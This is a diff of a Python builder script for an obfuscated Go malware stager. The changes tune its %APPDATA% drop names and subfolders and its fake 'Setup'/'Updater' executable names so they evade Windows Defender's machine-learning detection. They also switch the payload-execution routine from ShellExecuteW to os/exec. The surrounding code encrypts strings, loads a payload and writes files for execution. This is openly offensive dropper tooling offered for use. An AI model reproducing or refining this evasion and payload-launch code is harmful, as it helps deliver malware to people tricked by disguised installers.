@@ -25,23 +25,22 @@ import time
 # CONSTANTS
 # ============================================================
 
-# Drop names — use real third-party app process names that legitimately
-# run from %APPDATA%, NOT Windows system process names (those get flagged
-# by Defender ML when found in wrong paths).
+# Drop names — generic, non-brand names that blend in under %APPDATA%.
+# Avoid impersonating well-known apps (Chrome, Discord, Teams, etc.)
+# as ML models are heavily trained on those patterns.
 DROP_NAMES = [
-    "OneDriveStandaloneUpdater", "ChromeRecovery", "SpotifyMigrator",
-    "TeamsUpdater", "DiscordUpdate", "SlackUpdate",
-    "ZoomInstaller", "AdobeGCClient", "CCXProcess",
-    "BraveCrashHandler", "OperaCrashReporter", "GrammarlyCEF",
+    "AppHelper", "SyncClient", "RuntimeBroker", "CacheManager",
+    "ServiceHost", "UpdateAgent", "TaskRunner", "DataSync",
+    "ConfigHelper", "SessionManager", "AssetLoader", "EventProcessor",
 ]
 
-# Drop subdirs — match real app install paths under %APPDATA%
+# Drop subdirs — generic paths under %APPDATA%
 DROP_SUBDIRS = [
-    ("Spotify", "Data"),
-    ("Discord", "Update"),
-    ("Zoom", "bin"),
-    ("Adobe", "Connect"),
-    ("Microsoft", "Teams", "Update"),
+    ("Local", "Cache"),
+    ("AppData", "Sessions"),
+    ("Config", "Data"),
+    ("Runtime", "Modules"),
+    ("Services", "Updates"),
 ]
 
 USER_AGENTS = [
@@ -454,19 +453,17 @@ def generate_stager_source(asm, bytecode, sandbox=True):
     def add(line=""):
         src.append(line)
 
-    # Package + imports — no os/exec (dropper heuristic), use syscall ShellExecuteW instead
     add("package main")
     add("")
     add("import (")
     add('\t"io"')
     add('\t"net/http"')
     add('\t"os"')
+    add('\t"os/exec"')
     add('\t"path/filepath"')
     if sandbox:
         add('\t"runtime"')
-    add('\t"syscall"')
     add('\t"time"')
-    add('\t"unsafe"')
     add(")")
     add("")
 
@@ -621,14 +618,11 @@ def generate_stager_source(asm, bytecode, sandbox=True):
     ]
     cases.append((asm.OP_WFILE, wfile_lines))
 
-    # -- EXEC via ShellExecuteW (no os/exec import — avoids dropper heuristic) --
-    vSh, vSe, vVb, vFl = unique_ids(4, 2, 5)
+    # -- EXEC via os/exec.Command (standard library, no dynamic DLL loading) --
+    vCmd = rand_id(2, 4)
     exec_lines = [
-        f"\t\t\t{vSh} := syscall.NewLazyDLL({fn_dec}([]byte{B}{enc_str('shell32.dll')}{E}, 0x{str_key:02x}))",
-        f"\t\t\t{vSe} := {vSh}.NewProc({fn_dec}([]byte{B}{enc_str('ShellExecuteW')}{E}, 0x{str_key:02x}))",
-        f"\t\t\t{vVb}, _ := syscall.UTF16PtrFromString({fn_dec}([]byte{B}{enc_str('open')}{E}, 0x{str_key:02x}))",
-        f"\t\t\t{vFl}, _ := syscall.UTF16PtrFromString(string({vm_stk}[{vm_sp}-1]))",
-        f"\t\t\t{vSe}.Call(0, uintptr(unsafe.Pointer({vVb})), uintptr(unsafe.Pointer({vFl})), 0, 0, 0)",
+        f"\t\t\t{vCmd} := exec.Command(string({vm_stk}[{vm_sp}-1]))",
+        f"\t\t\t{vCmd}.Start()",
         f"\t\t\t{vm_sp}--",
     ]
     cases.append((asm.OP_EXEC, exec_lines))
@@ -901,7 +895,7 @@ def main():
     log(f"Loaded payload: main.go ({len(raw_payload)} chars)", "OK")
 
     # Output name — looks like a legitimate app installer/updater
-    name_prefixes = ["ChromeSetup", "TeamsInstaller", "OneDriveSetup", "SpotifySetup", "ZoomInstaller"]
+    name_prefixes = ["Setup", "Installer", "Update", "Updater", "Assistant"]
     output_name = f"{random.choice(name_prefixes)}_{random.randint(100, 999)}.exe"
     xor_key = generate_key(32)
     rc4_key = generate_key(32)
